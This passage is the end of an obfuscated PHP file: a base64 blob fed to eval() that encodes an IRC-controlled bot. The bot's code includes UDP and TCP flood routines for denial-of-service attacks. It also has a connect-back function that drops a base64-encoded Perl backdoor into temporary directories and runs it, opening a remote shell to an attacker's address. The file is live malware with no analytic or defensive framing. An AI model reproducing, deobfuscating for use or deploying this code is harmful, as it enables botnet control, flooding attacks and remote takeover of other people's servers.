AgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgfSANCiAgICAgICAgICB9IA0KICAgICAgIH0gDQogICAgICAgJG9sZF9idWYgPSAkdGhpcy0+YnVmOyANCiAgICB9IA0KICAgICR0aGlzLT5zdGFydCgpOyANCiB9IA0KIGZ1bmN0aW9uIHNlbmQoJG1zZykgDQogeyANCiAgICBmd3JpdGUoJHRoaXMtPmNvbm4sIiRtc2dcclxuIik7IA0KIH0gDQogZnVuY3Rpb24gam9pbigkY2hhbikgDQogeyANCiAgICAkdGhpcy0+c2VuZCgiSk9JTiAkY2hhbiIpOyANCiB9IA0KIGZ1bmN0aW9uIHByaXZtc2coJHRvLCRtc2cpDQogew0KICAgICR0aGlzLT5zZW5kKCJQUklWTVNHICR0byA6JG1zZyIpOw0KIH0NCiBmdW5jdGlvbiBub3RpY2UoJHRvLCRtc2cpDQogew0KICAgICR0aGlzLT5zZW5kKCJOT1RJQ0UgJHRvIDokbXNnIik7DQogfQ0KIGZ1bmN0aW9uIGlzX2xvZ2dlZF9pbigkaG9zdCkgDQogeyANCiAgICBpZihpc3NldCgkdGhpcy0+dXNlcnNbJGhvc3RdKSkgDQogICAgICAgcmV0dXJuIDE7IA0KICAgIGVsc2UgDQogICAgICAgcmV0dXJuIDA7IA0KIH0gDQogZnVuY3Rpb24gbG9nX2luKCRob3N0KSANCiB7IA0KICAgICR0aGlzLT51c2Vyc1skaG9zdF0gPSB0cnVlOyANCiB9IA0KIGZ1bmN0aW9uIGxvZ19vdXQoJGhvc3QpIA0KIHsgDQogICAgdW5zZXQoJHRoaXMtPnVzZXJzWyRob3N0XSk7IA0KIH0gDQogZnVuY3Rpb24gc2V0X25pY2soKSANCiB7IA0KICAgIGlmKGlzc2V0KCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSkpIA0KICAgIHsgDQogICAgICAgaWYoc3Ryc3RyKHN0cnRvbG93ZXIoJF9TRVJWRVJbJ1NFUlZFUl9TT0ZUV0FSRSddKSwiYXBhY2hlIikpIA0KICAgICAgICAgICR0aGlzLT5uaWNrID0gIltBXSI7IA0KICAgICAgIGVsc2VpZihzdHJzdHIoc3RydG9sb3dlcigkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10pLCJpaXMiKSkgDQogICAgICAgICAgJHRoaXMtPm5pY2sgPSAiW0ldIjsgDQogICAgICAgZWxzZWlmKHN0cnN0cihzdHJ0b2xvd2VyKCRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXSksInhpdGFtaSIpKSANCiAgICAgICAgICAkdGhpcy0+bmljayA9ICJbWF0iOyANCiAgICAgICBlbHNlIA0KICAgICAgICAgICR0aGlzLT5uaWNrID0gIltOXSI7IA0KICAgIH0gDQogICAgZWxzZSANCiAgICB7IA0KICAgICAgICR0aGlzLT5uaWNrID0gIltaXSI7IA0KICAgIH0gDQogICAgJHRoaXMtPm5pY2sgLj0gJHRoaXMtPmNvbmZpZ1sncHJlZml4J107IA0KICAgIGZvcigkaT0wOyRpPCR0aGlzLT5jb25maWdbJ21heHJhbmQnXTskaSsrKSANCiAgICAgICAkdGhpcy0+bmljayAuPSBtdF9yYW5kKDAsOSk7IA0KICAgICR0aGlzLT5zZW5kKCJOSUNLICIuJHRoaXMtPm5pY2spOw0KIH0gDQogIGZ1bmN0aW9uIHVkcGZsb29kKCRob3N0LCRwYWNrZXRzaXplLCR0aW1lKSB7DQoJJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJVZHBGbG9vZCBTdGFydGVkIVwyXSIpOyANCgkkcGFja2V0ID0gIiI7DQoJZm9yKCRpPTA7JGk8JHBhY2tldHNpemU7JGkrKykgeyAkcGFja2V0IC49IGNocihtdF9yYW5kKDEsMjU2KSk7IH0NCgkkdGltZWkgPSB0aW1lKCk7DQoJJGkgPSAwOw0KCXdoaWxlKHRpbWUoKS0kdGltZWkgPCAkdGltZSkgew0KCQkkZnA9ZnNvY2tvcGVuKCJ1ZHA6Ly8iLiRob3N0LG10X3JhbmQoMCw2MDAwKSwkZSwkcyw1KTsNCiAgICAgIAlmd3JpdGUoJGZwLCRwYWNrZXQpOw0KICAgICAgIAlmY2xvc2UoJGZwKTsNCgkJJGkrKzsNCgl9DQoJJGVudiA9ICRpICogJHBhY2tldHNpemU7DQoJJGVudiA9ICRlbnYgLyAxMDQ4NTc2Ow0KCSR2ZWwgPSAkZW52IC8gJHRpbWU7DQoJJHZlbCA9IHJvdW5kKCR2ZWwpOw0KCSRlbnYgPSByb3VuZCgkZW52KTsNCgkkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMlVkcEZsb29kIEZpbmlzaGVkIVwyXTogJGVudiBNQiBEaWtpcmltIC8gTWVkaWE6ICR2ZWwgTUIvcyAiKTsNCn0NCiBmdW5jdGlvbiB0Y3BmbG9vZCgkaG9zdCwkcGFja2V0cywkcGFja2V0c2l6ZSwkcG9ydCwkZGVsYXkpIA0KIHsgDQogICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJUY3BGbG9vZCBTdGFydGVkIVwyXSIpOyANCiAgICAkcGFja2V0ID0gIiI7IA0KICAgIGZvcigkaT0wOyRpPCRwYWNrZXRzaXplOyRpKyspIA0KICAgICAgICRwYWNrZXQgLj0gY2hyKG10X3JhbmQoMSwyNTYpKTsgDQogICAgZm9yKCRpPTA7JGk8JHBhY2tldHM7JGkrKykgDQogICAgeyANCiAgICAgICBpZighJGZwPWZzb2Nrb3BlbigidGNwOi8vIi4kaG9zdCwkcG9ydCwkZSwkcyw1KSkgDQogICAgICAgeyANCiAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMlRjcEZsb29kXDJdOiBFcnJvcjogPCRlPiIpOyANCiAgICAgICAgICByZXR1cm4gMDsgDQogICAgICAgfSANCiAgICAgICBlbHNlIA0KICAgICAgIHsgDQogICAgICAgICAgZndyaXRlKCRmcCwkcGFja2V0KTsgDQogICAgICAgICAgZmNsb3NlKCRmcCk7IA0KICAgICAgIH0gDQogICAgICAgc2xlZXAoJGRlbGF5KTsgDQogICAgfSANCiAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMlRjcEZsb29kIEZpbmlzaGVkIVwyXTogQ29uZmlnIC0gJHBhY2tldHMgcGFrZXQgJGhvc3Q6JHBvcnQuIik7IA0KIH0NCiBmdW5jdGlvbiBjb25iYWNrKCRpcCwkcG9ydCkNCiB7DQogICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbXDJjb25iYWNrXDJdOiBtZW5jb2JhIG1lbmdodWJ1bmdrYW4ga2UgJGlwOiRwb3J0Iik7DQogICAgJGRjX3NvdXJjZSA9ICJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLY0hKcGJuUWdJa1JoZEdFZ1EyaGhNSE1nUTI5dWJtVmpkQ0JDWVdOcklFSmhZMnRrYjI5eVhHNWNiaUk3RFFwcFppQW9JU1JCVWtkV1d6QmRLU0I3RFFvZ0lIQnlhVzUwWmlBaVZYTmhaMlU2SUNRd0lGdEliM04wWFNBOFVHOXlkRDVjYmlJN0RRb2dJR1Y0YVhRb01TazdEUXA5RFFwd2NtbHVkQ0FpV3lwZElFUjFiWEJwYm1jZ1FYSm5kVzFsYm5SelhHNGlPdzBLSkdodmMzUWdQU0FrUVZKSFZsc3dYVHNOQ2lSd2IzSjBJRDBnT0RBN0RRcHBaaUFvSkVGU1IxWmJNVjBwSUhzTkNpQWdKSEJ2Y25RZ1BTQWtRVkpIVmxzeFhUc05DbjBOQ25CeWFXNTBJQ0piS2wwZ1EyOXVibVZqZEdsdVp5NHVMbHh1SWpzTkNpUndjbTkwYnlBOUlHZGxkSEJ5YjNSdllubHVZVzFsS0NkMFkzQW5LU0I4ZkNCa2FXVW9JbFZ1YTI1dmQyNGdVSEp2ZEc5amIyeGNiaUlwT3cwS2MyOWphMlYwS0ZORlVsWkZVaXdnVUVaZlNVNUZWQ3dnVTA5RFMxOVRWRkpGUVUwc0lDUndjbTkwYnlrZ2ZId2daR2xsSUNnaVUyOWphMlYwSUVWeWNtOXlYRzRpS1RzTkNtMTVJQ1IwWVhKblpYUWdQU0JwYm1WMFgyRjBiMjRvSkdodmMzUXBPdzBLYVdZZ0tDRmpiMjV1WldOMEtGTkZVbFpGVWl3Z2NHRmpheUFpVTI1Qk5IZzRJaXdnTWl3Z0pIQnZjblFzSUNSMFlYSm5aWFFwS1NCN0RRb2dJR1JwWlNnaVZXNWhZbXhsSUhSdklFTnZibTVsWTNSY2JpSXBPdzBLZlEwS2NISnBiblFnSWxzcVhTQlRjR0YzYm1sdVp5QlRhR1ZzYkZ4dUlqc05DbWxtSUNnaFptOXlheWdnS1NrZ2V3MEtJQ0J2Y0dWdUtGTlVSRWxPTENJK0psTkZVbFpGVWlJcE93MEtJQ0J2Y0dWdUtGTlVSRTlWVkN3aVBpWlRSVkpXUlZJaUtUc05DaUFnYjNCbGJpaFRWRVJGVWxJc0lqNG1VMFZTVmtWU0lpazdEUW9nSUdWNFpXTWdleWN2WW1sdUwzTm9KMzBnSnkxaVlYTm9KeUF1SUNKY01DSWdlQ0EwT3cwS0lDQmxlR2wwS0RBcE93MEtmUTBLY0hKcGJuUWdJbHNxWFNCRVlYUmhZMmhsWkZ4dVhHNGlPdz09IjsNCiAgICBpZiAoaXNfd3JpdGFibGUoIi90bXAiKSkNCiAgICB7DQogICAgICBpZiAoZmlsZV9leGlzdHMoIi90bXAvZGMucGwiKSkgeyB1bmxpbmsoIi90bXAvZGMucGwiKTsgfQ0KICAgICAgJGZwPWZvcGVuKCIvdG1wL2RjLnBsIiwidyIpOw0KICAgICAgZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRkY19zb3VyY2UpKTsNCiAgICAgIHBhc3N0aHJ1KCJwZXJsIC90bXAvZGMucGwgJGlwICRwb3J0ICYiKTsNCiAgICAgIHVubGluaygiL3RtcC9kYy5wbCIpOw0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgIGlmIChpc193cml0YWJsZSgiL3Zhci90bXAiKSkNCiAgICB7DQogICAgICBpZiAoZmlsZV9leGlzdHMoIi92YXIvdG1wL2RjLnBsIikpIHsgdW5saW5rKCIvdmFyL3RtcC9kYy5wbCIpOyB9DQogICAgICAkZnA9Zm9wZW4oIi92YXIvdG1wL2RjLnBsIiwidyIpOw0KICAgICAgZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRkY19zb3VyY2UpKTsNCiAgICAgIHBhc3N0aHJ1KCJwZXJsIC92YXIvdG1wL2RjLnBsICRpcCAkcG9ydCAmIik7DQogICAgICB1bmxpbmsoIi92YXIvdG1wL2RjLnBsIik7DQogICAgfQ0KICAgIGlmIChpc193cml0YWJsZSgiLiIpKQ0KICAgIHsNCiAgICAgIGlmIChmaWxlX2V4aXN0cygiZGMucGwiKSkgeyB1bmxpbmsoImRjLnBsIik7IH0NCiAgICAgICRmcD1mb3BlbigiZGMucGwiLCJ3Iik7DQogICAgICBmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJGRjX3NvdXJjZSkpOw0KICAgICAgcGFzc3RocnUoInBlcmwgZGMucGwgJGlwICRwb3J0ICYiKTsNCiAgICAgIHVubGluaygiZGMucGwiKTsNCiAgICB9DQogICAgfQ0KICB9DQp9IA0KJGJvdCA9IG5ldyB0bXA7IA0KJGJvdC0+c3RhcnQoKTsgDQo=";
eval(gzinflate(str_rot13(base64_decode($rhs))));
?>